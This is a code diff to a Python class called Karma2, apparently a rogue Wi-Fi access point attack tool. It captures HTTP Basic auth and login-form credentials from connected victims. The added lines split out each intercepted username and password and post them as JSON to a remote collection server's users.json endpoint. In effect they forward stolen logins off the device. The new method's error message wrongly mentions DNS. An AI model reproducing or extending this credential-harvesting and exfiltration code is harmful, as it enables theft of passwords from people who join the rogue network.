@@ -316,6 +316,9 @@ class Karma2:
         if authorization[0] == 'Basic':
           user_password = base64.b64decode(authorization[1])
           log( "%s login is %s"%(fullpath,_ctxt(user_password,RED)) )
+          login,password = user_password.split(':')
+          user = {'login':{'uri':fullpath,'login': login,  'password':password}}
+          self.server.app.update_login(user)
       except:
         pass
       
@@ -337,6 +340,8 @@ class Karma2:
           kvs = dict([ kv.split('=') for kv in urllib2.unquote(post).split('&')])
           log( "%s login is %s"%(fullpath, 
             _ctxt("%s:%s"%(kvs['username'], kvs['password']),RED)) )
+          user = {'login':{'uri':fullpath,'login': kvs['username'],  'password':kvs['password']}}
+          self.server.app.update_login(user)
         except:
           raise
             
@@ -660,7 +665,7 @@ class Karma2:
                         #self.setup_iface(self.ifhostapd.iface,subnet)
                       self.register_client(mac,ipsrc)
               if dns != {}: 
-                if self.karma.update_dns(dns):
+                if self.karma.update_dns({'dns':dns}):
                   log( "[+] %s %s => %s"%(_ctxt(self.essid,GREEN), dns['bssid'], dns['host']))
             self.activity_ts = time.time()
 
@@ -821,6 +826,16 @@ class Karma2:
       data = open(path,'r').read()
       data = data[0:-1] # remove EOL
       return data
+  
+  def update_login(self, login):
+    if self.uri is None:
+      return
+    try:
+      req = urllib2.Request('%s/users.json'%self.uri)
+      req.add_header('Content-Type', 'application/json')
+      response = urllib2.urlopen(req, json.dumps(login, ensure_ascii=False))
+    except:
+      log( "could not update dns")
   
   def update_dns(self, dns):
     if self.uri is None:
